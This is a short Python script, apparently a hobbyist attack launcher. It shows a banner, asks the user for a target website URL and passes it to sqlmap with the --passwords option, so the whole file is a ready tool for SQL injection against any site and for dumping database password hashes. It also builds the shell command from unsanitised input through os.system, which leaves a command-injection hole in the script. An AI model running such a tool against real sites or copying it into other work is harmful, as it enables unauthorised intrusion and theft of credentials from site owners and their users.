# Lib list for projects

from os import system as sys
from colorama import Fore
from time import sleep
from platform import system, uname as um


try: # For Error V,K

    def Page_clear():  # function Clear Data Terminal

        Data_clear = um()[0]

        if Data_clear == 'Linux':
            sys('clear')

    Page_clear() # Run function in Terminal


    def Data_page(): # Show Data Scripts in Terminal

        sys('neofetch')
        print(Fore.GREEN+'\n\n                                           DOMIN\n\n')

    Data_page() # Run function Data Script

    def selects(): # Selects Domin For attacks
        print(Fore.YELLOW+'['+Fore.RED+'!'+Fore.YELLOW+']'+Fore.LIGHTCYAN_EX+' Please Add Https + PHP?\n\n')
        Dominput = input(Fore.RED+'┌─{'+Fore.GREEN+'Attacks Sqlinjection'+Fore.YELLOW+'~'+Fore.BLUE+'DOMIN'+Fore.RED+Fore.RED+'}'+'\n└──╼> '+Fore.WHITE)

        sys('sqlmap -u '+str(Dominput)+' --passwords')

    selects()
except KeyboardInterrupt: # For Cont + c

    print(Fore.BLUE+'\n\nTANKS :)\n\n')

except ValueError: # For ValueError
    print('\n\nERROR !\n\n')